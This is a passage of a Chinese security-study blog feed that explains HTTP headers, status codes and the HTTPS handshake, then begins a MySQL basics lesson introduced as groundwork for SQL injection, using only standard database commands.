Nov 2010 08:12:31 GMT</li></ul></li><li><p><strong>From</strong></p></li><li><ul><li>发出请求的用户的 Email</li><li>From: <span class="exturl" data-url="bWFpbHRvOnVzZXJAZW1haWwuY29t">user@email.com</span></li></ul></li><li><p><strong>Host</strong></p></li><li><ul><li>指定请求的服务器的域名和端口号</li><li>Host: <span class="exturl" data-url="aHR0cDovL3d3dy5naXRodWIuY29t">www.github.com</span></li></ul></li><li><p><strong>Max-Forwards</strong></p></li><li><ul><li>限制信息通过代理和网关传送的时间</li><li>Max-Forwards: 10</li></ul></li><li><p><strong>Range</strong></p></li><li><ul><li>只请求实体的一部分，指定范围</li><li>Range: bytes=500-999</li></ul></li><li><p><strong>Referer</strong></p></li><li><ul><li>先前网页的地址，当前请求网页紧随其后，即来路</li><li>Referer: <span class="exturl" data-url="aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==">http://www.zcmhi.com/archives/71.html</span></li></ul></li><li><p><strong>TE</strong></p></li><li><ul><li>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</li><li>TE: trailers,deflate;q=0.5</li></ul></li><li><p><strong>Upgrade</strong></p></li><li><ul><li>向服务器指定某种传输协议以便服务器进行转换（如果支持）</li><li>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</li></ul></li><li><p><strong>User-Agent</strong></p></li><li><ul><li>User-Agent 的内容包含发出请求的用户信息（浏览器的版本号以及操作系统的信息）</li><li>User-Agent: Mozilla/5.0 (Linux; X11)</li></ul></li><li><p><strong>Via</strong></p></li><li><ul><li>通知中间网关或代理服务器地址，通信协议</li><li>Via: 1.0 fred, 1.1 <span class="exturl" data-url="aHR0cDovL25vd2hlcmUuY29t">nowhere.com</span> (Apache/1.1)</li></ul></li></ul><h3 id="http响应报文"><a class="markdownIt-Anchor" href="#http响应报文">#</a> HTTP 响应报文</h3><h4 id="1响应行"><a class="markdownIt-Anchor" href="#1响应行">#</a> 1：响应行</h4><p>响应行一般由协议版本、状态码及其描述组成 比如 HTTP/1.1 200 OK；</p><p>其中协议版本 HTTP/1.1 或者 HTTP/1.0，200 就是它的状态码，OK 则为它的描述。</p><h4 id="2响应头"><a class="markdownIt-Anchor" href="#2响应头">#</a> 2：响应头</h4><p>响应头用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。 设置 HTTP 响应头往往和状态码结合起来。例如，有好几个表示 “文档位置已经改变” 的状态代码都伴随着一个 Location 头，而 401 (Unauthorized) 状态代码则必须伴随一个 WWW-Authenticate 头。然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置 Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久 HTTP 连接，…… 等等许多其他任务。</p><h4 id="3响应体"><a class="markdownIt-Anchor" href="#3响应体">#</a> 3：响应体</h4><p>响应体就是响应的消息体，如果是纯数据就是返回纯数据，如果请求的是 HTML 页面，那么返回的就是 HTML 代码，如果是 JS 就是 JS 代码，如此之类。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623382685076-b0271757-70e6-4c7d-ae9f-52c705370d32.png" alt="img"></p><h4 id="4常见的响应头"><a class="markdownIt-Anchor" href="#4常见的响应头">#</a> 4：常见的响应头</h4><ul><li><p><strong>Accept-Ranges</strong></p></li><li><ul><li>表明服务器是否支持指定范围请求及哪种类型的分段请求</li><li>Accept-Ranges: bytes</li></ul></li><li><p><strong>Access-Control-Allow-Origin</strong></p></li><li><ul><li>配置有权限访问资源的域</li><li>Access-Control-Allow-Origin: <origin>|*</li></ul></li><li><p><strong>Age</strong></p></li><li><ul><li>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</li><li>Age: 12</li></ul></li><li><p><strong>Allow</strong></p></li><li><ul><li>对某网络资源的有效的请求行为，不允许则返回 405</li><li>Allow: GET, HEAD</li></ul></li><li><p><strong>Cache-Control</strong></p></li><li><ul><li>告诉所有的缓存机制是否可以缓存及哪种类型</li><li>Cache-Control: no-cache</li></ul></li><li><p><strong>Content-Encoding</strong></p></li><li><ul><li>web 服务器支持的返回内容压缩编码类型。</li><li>Content-Encoding: gzip</li></ul></li><li><p><strong>Content-Language</strong></p></li><li><ul><li>响应体的语言</li><li>Content-Language: en,zh</li></ul></li><li><p><strong>Content-Length</strong></p></li><li><ul><li>响应体的长度</li><li>Content-Length: 348</li></ul></li><li><p><strong>Content-Location</strong></p></li><li><ul><li>请求资源可替代的备用的另一地址</li><li>Content-Location: /index.htm</li></ul></li><li><p><strong>Content-MD5</strong></p></li><li><ul><li>返回资源的 MD5 校验值</li><li>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</li></ul></li><li><p><strong>Content-Range</strong></p></li><li><ul><li>在整个返回体中本部分的字节位置</li><li>Content-Range: bytes 21010-47021/47022</li></ul></li><li><p><strong>Content-Type</strong></p></li><li><ul><li>返回内容的 MIME 类型</li><li>Content-Type: text/html; charset=utf-8</li></ul></li><li><p><strong>Date</strong></p></li><li><ul><li>原始服务器消息发出的时间</li><li>Date: Tue, 15 Nov 2010 08:12:31 GMT</li></ul></li><li><p><strong>Expires</strong></p></li><li><ul><li>响应过期的日期和时间</li><li>Expires: Thu, 01 Dec 2010 16:00:00 GMT</li></ul></li><li><p><strong>Last-Modified</strong></p></li><li><ul><li>请求资源的最后修改时间</li><li>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</li></ul></li><li><p><strong>Location</strong></p></li><li><ul><li>用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源</li><li>Location: <span class="exturl" data-url="aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==">http://www.zcmhi.com/archives/94.html</span></li></ul></li><li><p><strong>Refresh</strong></p></li><li><ul><li>应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）</li><li>Refresh: 5; url=http://www.zcmhi.com/archives/94.html</li></ul></li><li><p><strong>Server</strong></p></li><li><ul><li>web 服务器软件名称</li><li>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</li></ul></li><li><p><strong>Set-Cookie</strong></p></li><li><ul><li>设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</li></ul></li><li><p><strong>Strict-Transport-Security</strong></p></li><li><ul><li>设置浏览器强制使用 HTTPS 访问</li><li>max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求</li></ul></li><li><ul><li>includeSubDomains: 网站的子域名也启用规则</li><li>Strict-Transport-Security: max-age=1000; includeSubDomains</li></ul></li><li><p><strong>Trailer</strong></p></li><li><ul><li>指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards</li></ul></li><li><p><strong>Transfer-Encoding</strong></p></li><li><ul><li>文件传输编码</li><li>Transfer-Encoding:chunked</li></ul></li><li><p><strong>Vary</strong></p></li><li><ul><li>告诉下游代理是使用缓存响应还是从原始服务器请求</li><li>Vary: *</li></ul></li><li><p><strong>Via</strong></p></li><li><ul><li>告知代理客户端响应是通过哪里发送的</li><li>Via: 1.0 fred, 1.1 <span class="exturl" data-url="aHR0cDovL25vd2hlcmUuY29t">nowhere.com</span> (Apache/1.1)</li></ul></li><li><p><strong>WWW-Authenticate</strong></p></li><li><ul><li>表明客户端请求实体应该使用的授权方案</li><li>WWW-Authenticate: Basic</li></ul></li><li><p><strong>X-Content-Type-Options</strong></p></li><li><ul><li>配置禁止 MIME 类型嗅探</li><li>X-Content-Type-Options: nosniff</li></ul></li><li><p><strong>X-Frame-Options</strong></p></li><li><ul><li>配置页面是否能出现在 <frame>, <iframe>, <embed>, <object> 等标签中，防止点击劫持</li><li>X-Frame-Options: deny</li></ul></li><li><p><strong>X-XSS-Protection</strong></p></li><li><ul><li>配置 XSS 防护机制</li><li>X-XSS-Protection: 1; mode=block</li></ul></li></ul><h3 id="http响应码"><a class="markdownIt-Anchor" href="#http响应码">#</a> HTTP 响应码</h3><h4 id="1xx临时响应"><a class="markdownIt-Anchor" href="#1xx临时响应">#</a> 1xx (临时响应)</h4><p>表示临时响应并需要请求者继续执行操作的状态代码。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623383144601-8d2ccf90-52d2-4b09-916c-23e66a95bc42.png" alt="img"></p><h4 id="2xx成功"><a class="markdownIt-Anchor" href="#2xx成功">#</a> 2xx (成功)</h4><p>表示成功处理了请求的状态代码。（201 的请求方法为 put）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623383374670-6a174b75-90ec-4b8a-85fc-6c580529b8c1.png" alt="img"></p><h4 id="3xx重定向"><a class="markdownIt-Anchor" href="#3xx重定向">#</a> 3xx (重定向)</h4><p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623383636015-a09ccdf2-ebbb-4821-9e8a-516b2cdc02fd.png" alt="img"></p><h4 id="4xx请求错误"><a class="markdownIt-Anchor" href="#4xx请求错误">#</a> 4xx (请求错误)</h4><p>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623384149279-0fab9b9f-925a-4222-9d49-299632e915bf.png" alt="img"></p><h4 id="5xx服务器错误"><a class="markdownIt-Anchor" href="#5xx服务器错误">#</a> 5xx (服务器错误)</h4><p>这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623384337008-f4573aef-9930-4bbd-86c8-57706b78497f.png" alt="img"></p><h2 id="https协议"><a class="markdownIt-Anchor" href="#https协议">#</a> HTTPS 协议</h2><p>HTTPS (HyperText Transfer Protocol over Secure Socket Layer) 可以理解为 HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL。</p><p>HTTPS 默认工作在 TCP 协议 443 端口，它的工作流程一般如以下方式：</p><ul><li><p>1、TCP 三次同步握手</p></li><li><p>2、客户端验证服务器数字证书</p></li><li><p>3、DH 算法协商对称加密算法的密钥、hash 算法的密钥</p></li><li><p>4、SSL 安全加密隧道协商完成</p></li><li><p>5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的 hash 算法进行数据完整性保护，保证数据不被篡改。</p></li></ul><p>证书失效或证书验证失败，网站通常会返回如下页面：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1625052324418-55faa66d-8a07-4a91-a512-fd4bdd8cf030.png" alt="img"></p><h3 id="ca"><a class="markdownIt-Anchor" href="#ca">#</a> CA</h3><p>CA (Certificate Authority) 是颁发数字证书的机构。是负责发放和管理数字证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。</p><h3 id="http-与-https-区别"><a class="markdownIt-Anchor" href="#http-与-https-区别">#</a> HTTP 与 HTTPS 区别</h3><ul><li><p>HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</p></li><li><p>使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。</p></li><li><p>HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS 除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。</p></li><li><p>http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</p></li><li><p>HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</p></li></ul><h3 id="https-的工作原理"><a class="markdownIt-Anchor" href="#https-的工作原理">#</a> HTTPS 的工作原理</h3><p>我们都知道 HTTPS 能够加密信息，以免敏感信息被第三方获取，所以很多银行网站或电子邮箱等等安全级别较高的服务都会采用 HTTPS 协议。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2336202/1641217288680-a87599c1-beb5-4654-bdad-15614a1ddc51.png" alt="img"></p><p><strong>1、客户端发起 HTTPS 请求</strong></p><p>这个没什么好说的，就是用户在浏览器里输入一个 https 网址，然后连接到 server 的 443 端口。</p><p><strong>2、服务端的配置</strong></p><p>采用 HTTPS 协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面 (startssl 就是个不错的选择，有 1 年的免费服务)。</p><p>这套证书其实就是一对公钥和私钥，如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。</p><p><strong>3、传送证书</strong></p><p>这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。</p><p><strong>4、客户端解析证书</strong></p><p>这部分工作是有客户端的 TLS 来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p><p>如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。</p><p><strong>5、传送加密信息</strong></p><p>这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。</p><p><strong>6、服务端解密信息</strong></p><p>服务端用私钥解密后，得到了客户端传过来的随机值 (私钥)，然后把内容通过该值进行对称加密，所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。</p><p><strong>7、传输加密后的信息</strong></p><p>这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。</p><p><strong>8、客户端解密信息</strong></p><p>客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容，整个过程第三方即使监听到了数据，也束手无策。</p><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第三天http通信基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第三天http通信基础&quot;&gt;#&lt;/a&gt; 第三天：HTTP 通信基础&lt;/h1&gt;
&lt;h2 id=&quot;web介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/18/%E4%BF%AE%E6%94%B9/%E8%99%9A%E6%8B%9F%E7%9B%AE%E5%BD%95%EF%BC%9A%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E5%AD%90%E7%BD%91%E7%AB%99/"/>
    <id>https://sun-spots.github.io/2022/01/18/%E4%BF%AE%E6%94%B9/%E8%99%9A%E6%8B%9F%E7%9B%AE%E5%BD%95%EF%BC%9A%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E5%AD%90%E7%BD%91%E7%AB%99/</id>
    <published>2022-01-18T07:48:52.921Z</published>
    <updated>2022-01-18T07:48:52.922Z</updated>
    
    <content type="html"><![CDATA[<p>虚拟目录：创建虚拟子网站</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虚拟目录：创建虚拟子网站&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MySQL基本语法及sql注入</title>
    <link href="https://sun-spots.github.io/2022/01/15/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.5MySQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E5%8F%8Asql%E6%B3%A8%E5%85%A5/"/>
    <id>https://sun-spots.github.io/2022/01/15/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.5MySQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E5%8F%8Asql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-01-15T12:05:00.000Z</published>
    <updated>2022-03-17T02:14:36.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql基本语法及sql注入"><a class="markdownIt-Anchor" href="#mysql基本语法及sql注入">#</a> MySQL 基本语法及 sql 注入</h1><h2 id="课堂导学"><a class="markdownIt-Anchor" href="#课堂导学">#</a> 课堂导学：</h2><p>Sql 语句的学习主要为渗透中 Sql 注入漏洞打下坚实基础，这样在学 Sql 注入漏洞时才能一马平川。</p><h2 id="知识框架"><a class="markdownIt-Anchor" href="#知识框架">#</a> 知识框架：</h2><p>1：常见 SQL 语句</p><p>2：SQL 之增删改查</p><p>3：SQL 中 tips</p><p>4：注入中常见的 sql 函数</p><h2 id="1常见的sql语句"><a class="markdownIt-Anchor" href="#1常见的sql语句">#</a> 1：常见的 SQL 语句</h2><h3 id="11sql介绍"><a class="markdownIt-Anchor" href="#11sql介绍">#</a> 1.1：SQL 介绍</h3><ul><li><ul><li>SQL 是用于访问和处理数据库的标准的计算机语言。</li><li>SQL，指结构化查询语言，全称是 Structured Query Language。</li></ul></li><li><ul><li>SQL 让您可以访问和处理数据库。</li><li>SQL 是一种 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言。</li></ul></li><li><ul><li>简单来说就是按照 数据结构来组织、 存储和管理数据的仓库。</li><li>数据库是以一定方式储存在一起、能与多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。</li></ul></li><li><ul><li>MySQL 也是一个<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlQjMlRTclQjMlQkIlRTUlOUUlOEIlRTYlOTUlQjAlRTYlOEQlQUUlRTUlQkElOTMlRTclQUUlQTElRTclOTAlODYlRTclQjMlQkIlRTclQkIlOUYvNjk2NTEx">关系型数据库管理系统</span>，也是最受欢迎的开源软件之一。</li></ul></li></ul><h3 id="12sql特点"><a class="markdownIt-Anchor" href="#12sql特点">#</a> 1.2：SQL 特点</h3><ul><li><ul><li>SQL 面向数据库执行查询</li><li>SQL 可从数据库取回数据</li></ul></li><li><ul><li>SQL 可在数据库中插入新的记录</li><li>SQL 可更新数据库中的数据</li></ul></li><li><ul><li>SQL 可从数据库删除记录</li><li>SQL 可创建新数据库</li></ul></li><li><ul><li>SQL 可在数据库中创建新表</li><li>SQL 可在数据库中创建存储过程</li></ul></li><li><ul><li>SQL 可在数据库中创建视图</li><li>SQL 可以设置表、存储过程和视图的权限</li></ul></li></ul><h3 id="13数据库操作"><a class="markdownIt-Anchor" href="#13数据库操作">#</a> 1.3：数据库操作</h3><h4 id="连接数据库"><a class="markdownIt-Anchor" href="#连接数据库">#</a> 连接数据库</h4><p>明文连接</p><p>mysql -h127.0.0.1 -P3306 -uroot -proot  – 明文</p><p>如果连接本地数据库 -h 可以省略 如果服务器端口是 3306，-P 端口号也可以省略</p><p><strong>-h 后面跟的是访问的主机 IP 地址，-u 后面为数据库的用户名，-p 为数据库的密码，-P 为连接的服务器的端口号</strong></p><p>mysql -uroot -proot– 明文</p><p>密文连接</p><p>mysql -uroot -p</p><p>Enter password: ****</p><h4 id="退出数据库"><a class="markdownIt-Anchor" href="#退出数据库">#</a> 退出数据库</h4><p>EXIT       -- 方法一</p><p>quit         -- 方法二</p><p>\q            -- 方法三</p><p>ctrl+c      -- 方法四</p><h4 id="注意"><a class="markdownIt-Anchor" href="#注意">#</a> 注意</h4><p>sql 语句最后以 “;” 结尾</p><h3 id="14常用的sql语句"><a class="markdownIt-Anchor" href="#14常用的sql语句">#</a> 1.4：常用的 SQL 语句</h3><p>查询当前数据库版本：select version ();</p><p>查询当前数据库用户：select user ();</p><p>查询当前路径：select @@basedir;   // 该路径为数据库安装的位置</p><p>查询所有数据库：show databases;</p><p>选择一个数据库：use + 数据库名；</p><p>查询当前数据库：select database ();</p><p>查询所有表名：show tables;</p><p>创建一个数据库：create database 数据库名；</p><p>删除一个数据库：drop database 数据库名；</p><p>查询一个表的结构：desc 表名；</p><h3 id="15数据库表字段的运用"><a class="markdownIt-Anchor" href="#15数据库表字段的运用">#</a> 1.5：数据库表，字段的运用</h3><h4 id="数据库表"><a class="markdownIt-Anchor" href="#数据库表">#</a> 数据库表</h4><ul><li><ul><li>一个数据库通常包含一个或多个表。每个表由一个名字标识（例如 “客户” 或者 “订单”）；表包含带有数据的记录（行）。</li><li>下面的例子是一个名为 “Persons” 的表：</li></ul></li></ul><p>表包含三条记录（每一条对应一个人）和五个列（Id、姓、名、地址和城市），行为一个表的记录，列为一个表的字段</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934373498-e2d668b2-f1d2-45fe-9cb0-cb4ba430c67d.png" alt="img"></p><h4 id="sql-dml-和-ddl"><a class="markdownIt-Anchor" href="#sql-dml-和-ddl">#</a> SQL DML 和 DDL</h4><p>可以把 SQL 分为两个部分：数据操作语言 (DML) 和 数据定义语言 (DDL)。</p><h4 id="sql-的-dml-部分"><a class="markdownIt-Anchor" href="#sql-的-dml-部分">#</a> SQL 的 DML 部分</h4><ul><li><p>SELECT - 从数据库表中获取数据</p></li><li><p>UPDATE - 更新数据库表中的数据</p></li><li><p>DELETE - 从数据库表中删除数据（删除数据用 delect，删除表、数据库、视图、索引等用 drop）</p></li><li><p>INSERT INTO - 向数据库表中插入数据</p></li></ul><h4 id="sql-dml-和-ddl-2"><a class="markdownIt-Anchor" href="#sql-dml-和-ddl-2">#</a> SQL DML 和 DDL</h4><ul><li><p>CREATE DATABASE - 创建新数据库</p></li><li><p>ALTER DATABASE - 修改数据库</p></li><li><p>CREATE TABLE - 创建新表</p></li><li><p>ALTER TABLE - 变更（改变）数据库表（此处的修改包括对数据表的数据修改和对表修改）</p></li><li><p>DROP TABLE - 删除表</p></li><li><p>CREATE INDEX - 创建索引（搜索键）</p></li><li><p>DROP INDEX - 删除索引</p></li></ul><p><strong>SQL 对大小写不敏感；</strong></p><h4 id="创建表"><a class="markdownIt-Anchor" href="#创建表">#</a> 创建表</h4><p><strong>语法</strong>：create table 数据表名字 (字段 类型 约束 [, 字段 类型 约束]);</p><p>例如：create table student (id int,name varchar (20),add varchar (20),phone varchar (20));</p><p><strong>约束</strong>：</p><p>auto_increment表示自动增长// 表示数值会随着数据的插入数值会相应的自动的增加</p><p>not null 表示不能为空</p><p>primary key 表示主键</p><p>foreign key       标识该属性为该表的外键，是与之联系某表的主键</p><p>default 默认值</p><p>unique        标识该属性的值是唯一的</p><h4 id="举例针对表常用命令"><a class="markdownIt-Anchor" href="#举例针对表常用命令">#</a> 举例 (针对表常用命令)</h4><p>在 class 数据库下创建 student 表 (id、name、age、sex、birthday)</p><p>create table student(id int,name varchar(20),age int,sex varchar(20),birthday int);</p><p>查看表结构</p><p>desc student;</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/1794ff3dcaf4a34d.png" alt=""></p><p>各字段的含义解释</p><ul><li><ul><li><ul><li>Null：表示该列是否可以存储 NULL 值（表示该列是否可以为空）。</li><li>Key：表示该列是否已编制索引。PRI 表示该列是表主键的一部分，UNI 表示该列是 UNIQUE 索引的一部分，MUL 表示在列中某个给定值允许出现多次。</li></ul></li></ul></li><li><ul><li><ul><li><p>Default：表示该列是否有默认值，如果有，值是多少。</p></li><li><p>Extra：表示可以获取的与给定列有关的附加信息，如 AUTO_INCREMENT （自增）等。</p><p>查看创建表时的 CREATE TABLE 语句</p></li></ul></li></ul></li><li><ul><li><ul><li><p>SHOW CREATE TABLE 表名 \G；   如果不加 \G 参数显示会混乱，加了显示结果易于查看，比较直观。</p><p>该语句的意思是：显示出创建表的 sql 语句。在不适用 “\G” 是现实出的代码有些凌乱。</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/6fe034e7c07f8f03.png" alt=""></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/672b3469f7aafbf6.png" alt=""></p></li></ul></li></ul></li></ul><p>删除表</p><p>drop table student;</p><p>修改表名</p><p>ALTER TABLE 旧表名 RENAME 新表名；</p><h4 id="举例针对字段常用命令"><a class="markdownIt-Anchor" href="#举例针对字段常用命令">#</a> 举例 (针对字段常用命令)</h4><p>修改字段名</p><p>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</p><p>添加字段</p><p>ALTER TABLE &lt;表名&gt; ADD &lt; 新字段名 &gt; &lt; 数据类型 &gt; [约束条件] [FIRST|AFTER 已存在的字段名]；</p><p>ALTER TABLE admin ADD user_name varchar(20) DEFAULT NULL age int(10) DEFAULT NULL;</p><p>新字段名为需要添加的字段的名称；</p><p>FIRST 为可选参数，其作用是将新添加的字段设置为表的第一个字段；</p><p>AFTER 为可选参数，其作用是将新添加的字段添加到指定的已存在的字段名的后面；</p><p>DEFAULT NULL 默认为 NULL。</p><p>删除字段</p><p>ALTER TABLE 表名 DROP 字段名；</p><h3 id="16mysql常见的数据类型"><a class="markdownIt-Anchor" href="#16mysql常见的数据类型">#</a> 1.6：Mysql 常见的数据类型</h3><h4 id="数值类型"><a class="markdownIt-Anchor" href="#数值类型">#</a> 数值类型</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934729617-62cc7f2f-4fa9-417a-9e0d-286841d9db06.png" alt="img"></p><h4 id="日期和时间类型"><a class="markdownIt-Anchor" href="#日期和时间类型">#</a> 日期和时间类型</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934749713-cf3fa5ec-36f6-4b34-a011-2760b12394c9.png" alt="img"></p><h4 id="字符串类型"><a class="markdownIt-Anchor" href="#字符串类型">#</a> 字符串类型</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934764195-2399cd03-1085-434a-b7fc-e3f61a45bc75.png" alt="img"></p><h4 id="mysql整数类型"><a class="markdownIt-Anchor" href="#mysql整数类型">#</a> MYSQL 整数类型</h4><p>MySQL 主要提供的整数类型有 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，其属性字段可以添加 AUTO_INCREMENT 自增约束条件。下表中列出了 MySQL 中的数值类型：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934816867-6ab3d30b-caa2-44e5-a8ca-49c8670ee68e.png" alt="img"></p><h4 id="mysql小数类型"><a class="markdownIt-Anchor" href="#mysql小数类型">#</a> MYSQL 小数类型</h4><p>浮点类型有两种，分别是单精度浮点数（FLOAT）和双精度浮点数（DOUBLE）：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934874530-d7e8735c-4e13-4881-8525-d2a0fdc21a6b.png" alt="img"></p><h4 id="mysql字符串类型"><a class="markdownIt-Anchor" href="#mysql字符串类型">#</a> MYSQL 字符串类型</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624934920255-a77063dc-41f8-436c-9786-69ec4238dcf9.png" alt="img"></p><p>VARCHAR 和 TEXT 类型是变长类型，其存储需求取决于列值的实际长度（在前面的表格中用 L 表示），而不是取决于类型的最大可能尺寸。</p><p>例如，一个 VARCHAR (10) 列能保存一个最大长度为 10 个字符的字符串，实际的存储需要字符串的长度 L 加上一个字节以记录字符串的长度。对于字符 “abcd”，L 是 4，而存储要求 5 个字节。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624935054825-2e99e3c2-c4a7-4934-bef6-ec59345fb975.png" alt="img"></p><p>对比结果可以看到，CHAR (4) 定义了固定长度为 4 的列，无论存入的数据长度为多少，所占用的空间均为 4 个字节。VARCHAR (4) 定义的列所占的字节数为实际长度加 1。</p><h3 id="17mysql主键"><a class="markdownIt-Anchor" href="#17mysql主键">#</a> 1.7：Mysql 主键</h3><h4 id="mysql主键primary-key"><a class="markdownIt-Anchor" href="#mysql主键primary-key">#</a> MySQL 主键（PRIMARY KEY）</h4><p>&quot;主键（PRIMARY KEY）“的完整称呼是&quot; 主键约束”。</p><h4 id="选取设置主键约束的字段"><a class="markdownIt-Anchor" href="#选取设置主键约束的字段">#</a> 选取设置主键约束的字段</h4><ul><li><ul><li>主键约束即在表中定义一个主键来唯一确定表中每一个记录数据的标识符。主键可以是表中的某一列或者多列的组合，其中由多列组合的主键称为复合主键。主键应该遵守下面的规则：每个表只能定义一个主键。</li><li>主键值必须唯一标识表中的每一行，且不能为 NULL，即表中不可能存在两行数据有相同的主键值。这是唯一性原则。</li></ul></li><li><ul><li>一个列名只能在复合主键列表中出现一次。</li><li>复合主键不能包含不必要的多余列。当把复合主键的某一列删除后，如果剩下的列构成的主键仍然满足唯一性原则，那么这个复合主键是不正确的。这是最小化原则。</li></ul></li></ul><h4 id="在创建表时设置主键约束"><a class="markdownIt-Anchor" href="#在创建表时设置主键约束">#</a> 在创建表时设置主键约束</h4><ul><li><ul><li>在 CREATE TABLE 语句中，主键是通过 PRIMARY KEY 关键字来指定的。</li><li>在定义列的同时指定主键，语法规则如下：</li></ul></li></ul><p>字段名 数据类型 PRIMARY KEY；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624955289317-bb0970b1-e2b8-4571-8b61-1c8940726e06.png" 